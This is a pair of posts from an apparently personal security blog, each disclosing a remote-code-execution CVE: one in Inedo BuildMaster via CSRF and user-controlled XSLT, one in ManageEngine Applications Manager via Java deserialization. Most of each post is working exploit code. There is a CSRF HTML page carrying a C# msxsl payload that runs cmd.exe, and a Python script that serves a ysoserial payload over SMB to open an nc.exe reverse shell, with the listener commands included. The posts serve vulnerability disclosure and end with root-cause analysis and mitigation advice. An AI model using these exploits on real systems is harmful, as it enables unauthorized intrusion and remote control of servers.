=== Content from blog.jamesotten.com_23013e67_20250126_100945.html ===


[James Otten](https://blog.jamesotten.com/)

* [Home](https://blog.jamesotten.com/)
* [Posts](https://blog.jamesotten.com/post/)
* [CVEs](https://blog.jamesotten.com/cves/)
* [About](https://blog.jamesotten.com/about/)
* Contact

* [GitHub](https://github.com/james-otten)

© 2018 James Otten.  All rights reserved.

Built with [Hugo](https://gohugo.io/)
Theme [Blackburn](https://github.com/yoshiharuyamashita/blackburn)

# BuildMaster Configuration File Template XSLT RCE

##

14 May 2018

[RCE](https://blog.jamesotten.com/tags/rce) /
[XSLT](https://blog.jamesotten.com/tags/xslt) /
[CSRF](https://blog.jamesotten.com/tags/csrf) /
[CVE](https://blog.jamesotten.com/tags/cve) /
[BuildMaster](https://blog.jamesotten.com/tags/buildmaster)

In October of 2017 I discovered a vulnerability in [Inedo BuildMaster](https://inedo.com/buildmaster) 5.8.1 related to the use of [configuration file templates](https://inedo.com/support/documentation/buildmaster/modeling-applications/configuration-files) which allowed for RCE. This vulnerability could be exploited by an authenticated user directly, or by exploiting multiple CSRF vulnerabilities without the user’s knowledge in some cases.

## PoC

This is one of my favorite PoCs due to the number of languages used.

```
<html>
<!-- James Otten 2017 -->
<body>
<script src="https://code.jquery.com/jquery-3.2.1.js"></script>
<script>

function createIframe(html) {
    $('body').append('<iframe src="data:text/html,<html>' + encodeURIComponent(html) + '</html>"></iframe>');
}

function editConfigFile(baseUrl, configurationFileId, instance, template) {
    var url = baseUrl + "/0x44/BuildMaster.Web.WebApplication/Inedo.BuildMaster.Web.WebApplication.Pages.Applications.Configuration.EditConfigurationFilePage/SaveConfigFile";

    var html = basePage;
    html += '<form id="csrf" enctype="application/x-www-form-urlencoded" method="POST" action="' + url + '">';
    html += '<input type="text" value="' + configurationFileId + '" name="configFileId">';
    html += '<input type="text" value="RCE" name="notes">';
    html += '<input type="text" value="" name="releases">';
    html += '<input type="text" value="' + instance + '" name="i_Integration">';
    html += "<input type='text' value='" + template + "' name='i_Template'>";
    html += '</form>';

    createIframe(html);
}

function previewTransform(baseUrl, configurationFileId, serverId, versionNumber) {
    var url = baseUrl + "/0x44/BuildMaster.Web.WebApplication/Inedo.BuildMaster.Web.WebApplication.Pages.Applications.Configuration.DeployConfigurationFilePage/PreviewConfigFile";

    var html = basePage;
    html += '<form id="csrf" enctype="application/x-www-form-urlencoded" method="POST" action="' + url + '">';
    html += '<input type="text" value="' + configurationFileId + '" name="configFileId">';
    html += '<input type="text" value="Integration" name="instanceName">';
    html += '<input type="text" value="' + serverId + '" name="serverId">';
    html += '<input type="text" value="' + versionNumber + '" name="versionNumber">';
    html += '</form>';

    createIframe(html);
}

var basePage = '<script>document.addEventListener("DOMContentLoaded", function() { document.forms["csrf"].submit(); });</s' + 'cript>';

function exploit() {
    var configurationFileId = $('#configurationFileId').val();
    var baseUrl = $('#baseUrl').val();
    var serverId = $('#serverId').val();
    var versionNumber = $('#versionNumber').val();
    var instanceXml = $('#xml').val();
    var xsl = $('#xsl').val();

    editConfigFile(baseUrl, configurationFileId, instanceXml, xsl);

    setTimeout(function() {
        previewTransform(baseUrl, configurationFileId, serverId, versionNumber);
    }, 5000);
}

</script>

<h2>BuildMaster CSRF -> RCE<h2>
<p>Tested on version 5.8.1 (Build 5)</p>
<table>
<tr><td>Base url of BuildMaster instance</td><td><input id="baseUrl" value="http://127.0.0.1:82" /></td></tr>
<tr><td>configurationFileId</td><td><input id="configurationFileId" value="19" /></td></tr>
<tr><td>serverId</td><td><input id="serverId" value="135" /></td></tr>
<tr><td>versionNumber</td><td><input id="versionNumber" value="1" /></td></tr>
<tr><td>xml</td><td><textarea id="xml" rows="7" cols="80">
<?xml version='1.0'?>
<data>
 <commands>
  <command>whoami</command>
 </commands>
</data></textarea></td></tr>
<tr><td>xsl</td><td><textarea id="xsl" rows="30" cols="80"/>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(string command){
    System.Diagnostics.Process proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
    proc.StartInfo.RedirectStandardOutput = true;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.Arguments = "/c " + command;
    proc.Start();
    return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>
<xsl:template match="data">
 <outputs>
  <xsl:for-each select="commands">
   <output>
    <xsl:copy-of select="node()"/>
    <value><xsl:value-of select="user:execute(command)"/></value>
   </output>
  </xsl:for-each>
 </outputs>
</xsl:template>
</xsl:stylesheet></textarea></td></tr>
<tr><td><button onclick="exploit()">exploit</button></td></tr>
</table>
</body>
</html>

```
## Analysis

The root cause of this vulnerability is the use of an unsafe XSLT processor with user controlled XSLT. The XSLT processor in use by the application was [System.Xml.Xsl.XslTransform](https://msdn.microsoft.com/en-us/library/system.xml.xsl.xsltransform%28v%3Dvs.110%29.aspx) which, among other things, allows for the execution of arbitrary code through [msxsl:script](https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script).

As a developer using XSLT, it is very important to learn about the capabilities of your XSLT processor to make sure your processor of choice fits your use case and security model. I also suggest trying to avoid executing user controlled XSLT if possible as it is very easy to misconfigure a XSLT processor to allow for arbitrary file reads, SSRF, or even RCE.

## Mitigation

Updating to BuildMaster 5.8.2+ will prevent attackers from exploiting this vulnerability.

## More information

* [CVE-2017-16521](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16521)
* [BM-3108](https://inedo.myjetbrains.com/youtrack/issue/BM-3108)

[BuildMaster Event Listener RCE](https://blog.jamesotten.com/post/buildmaster-event-listener-rce/)

[ManageEngine Applications Manager Deserialization Unauthenticated RCE](https://blog.jamesotten.com/post/applications-manager-rce/)

Please enable JavaScript to view the [comments powered by Disqus.](http://disqus.com/?ref_noscript)
[comments powered by Disqus](http://disqus.com/)



=== Content from blog.jamesotten.com_6c5864e3_20250125_160810.html ===


[James Otten](https://blog.jamesotten.com/)

* [Home](https://blog.jamesotten.com/)
* [Posts](https://blog.jamesotten.com/post/)
* [CVEs](https://blog.jamesotten.com/cves/)
* [About](https://blog.jamesotten.com/about/)
* Contact

* [GitHub](https://github.com/james-otten)

© 2018 James Otten.  All rights reserved.

Built with [Hugo](https://gohugo.io/)
Theme [Blackburn](https://github.com/yoshiharuyamashita/blackburn)

# ManageEngine Applications Manager Deserialization Unauthenticated RCE

##

21 Sep 2018

[RCE](https://blog.jamesotten.com/tags/rce) /
[CVE](https://blog.jamesotten.com/tags/cve) /
[ManageEngine](https://blog.jamesotten.com/tags/manageengine) /
[Deserialization](https://blog.jamesotten.com/tags/deserialization)

This year at Black Hat USA I participated in Offensive Security’s [AWAE](https://www.offensive-security.com/information-security-training/advanced-web-attack-and-exploitation/). This training was extremely interesting and I would strongly recommend it to others interested in web application security. One of the modules in AWAE included looking at [ManageEngine Applications Manager](https://www.manageengine.com/products/applications_manager/). As I have some previous experience with web applications and writing PoCs, I occasionally found myself with some spare time during the training. I spent most of this spare time looking deeper into the applications that were included in the training and I ended up finding my first deserialization vulnerability. This vulnerability happens to be an unauthenticated remote root in ManageEngine Applications Manager running on Windows machines. While I have not seen this vulnerability posted online, I know for a fact that I am not the only one who has come across it.

## PoC

```
#!/usr/bin/python
###############################################################################################################
# Java deserialization vulnerability in Manage Engine Version 13 < 13740 (CustomFieldsFeedServlet) on Windows
# CVE-2018-16364
# Tested on Kali
# In seperate shells:
#     nc -nvlp 4444
#     python /usr/share/doc/python-impacket/examples/smbserver.py awae /root/awae
# James Otten 8/6/2018
###############################################################################################################

import os
import requests
import base64
import socket
import sys

def init_deps(share):
	os.system("cp /usr/share/windows-binaries/nc.exe %s" % share)
	output_jar = "%s/ysoserial-master.jar" % share
	if not os.path.isfile(output_jar):
		os.system("wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O %s" % output_jar)

def gen_payload(ip, port, out_file, share):
	cmd = "cmd.exe /c \\\\%s\\%s\\nc.exe %s %s -e cmd.exe" % (ip, share, ip, port)
	os.system("java -jar ysoserial-master.jar CommonsCollections1 '%s' > %s" % (cmd, out_file))

def print_usage():
	print "Usage:"
	print "\tpython %s <url> <local ip> <reverse shell port> <share name>" % sys.argv[0]
	print "\tpython %s https://manageengine:8443 192.168.124.139 4444 awae" % sys.argv[0]

if len(sys.argv) != 5:
	print_usage()
	exit()

host = sys.argv[1]
smb_host = sys.argv[2]
reverse_shell_port = sys.argv[3]
share = sys.argv[4]
serialized_file = "test.obj"
local_share_location = "/root/%s/" % share

init_deps(local_share_location)
gen_payload(smb_host, reverse_shell_port, local_share_location + serialized_file, share)

path = "/servlet/CustomFieldsFeedServlet?customFieldObject=\\\\%s\\%s\\%s" % (smb_host, share, serialized_file)

req = host + path
res = requests.get(req, verify=False)
if res.status_code == 200:
	print "Incoming reverse shell on %s" % reverse_shell_port
else:
	print "Exploit failed"
	print res.status_code
	print res.text

```

Shell 1:

```
nc -nvlp 4444

```

Shell 2:

```
python /usr/share/doc/python-impacket/examples/smbserver.py awae /root/awae

```

Shell 3:

```
python CustomFieldsFeedServlet.py https://manageengine:8443 192.168.124.139 4444 awae

```

`CustomFieldsFeedServlet` was available without authentication and it allowed for users to pass a file path that would be deserialized via [readObject()](https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#readObject()). In order to exploit this, the attacker needs to be able to make their payload accessible to the Applications Manager instance. On platforms other than Windows, the attacker can drop their payload to disk via one of the many SQL injection vulnerabilities in Applications Manager. It is easier to exploit this vulnerability on Windows as the class used to open the passed file path [will resolve and read data from UNC paths](https://stackoverflow.com/questions/1682194/java-read-file-from-network-device), which allows for exploitation without chaining vulnerabilities.

The payload used in this exploit is generated using [ysoserial](https://github.com/frohoff/ysoserial). This payload is served from a public SMB share on the attacker’s machine created with the [Impacket](https://github.com/CoreSecurity/impacket) [SMB server example](https://github.com/CoreSecurity/impacket/blob/master/examples/smbserver.py).

The exploit can be visualized through the following sequence diagram:
![Sequence Diagram](https://blog.jamesotten.com/img/ME/seq.png)

## Analysis

Several things went wrong to cause this vulnerability. First, the lack of authorization on a security sensitive endpoint was addressed previously in CVE-2018-11808. Second, developers need to take extra caution when dealing with the file system, especially when paths are user controlled input. It is very important to know how the classes you are using to interact with the file system will interact with “interesting edge cases” like symbolic links, hard links, and UNC paths. Finally, unsafe deserialization should be avoided even in cases where input can be trusted because having it in a codebase increases the likelihood that unsafe deserialization will be possible in the future either through copy/pasting or unforeseen requirements changes.

## Mitigation

While this vulnerability was remediated in Applications Manager 13740, I recommend discontinuing use of this software and rebuilding systems where ManageEngine/Zoho products are installed or systems where a ManageEngine/Zoho product had privileged access to.

## More information

* [CVE-2018-16364](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16364)

[BuildMaster Configuration File Template XSLT RCE](https://blog.jamesotten.com/post/buildmaster-xslt-rce/)

Please enable JavaScript to view the [comments powered by Disqus.](http://disqus.com/?ref_noscript)
[comments powered by Disqus](http://disqus.com/)


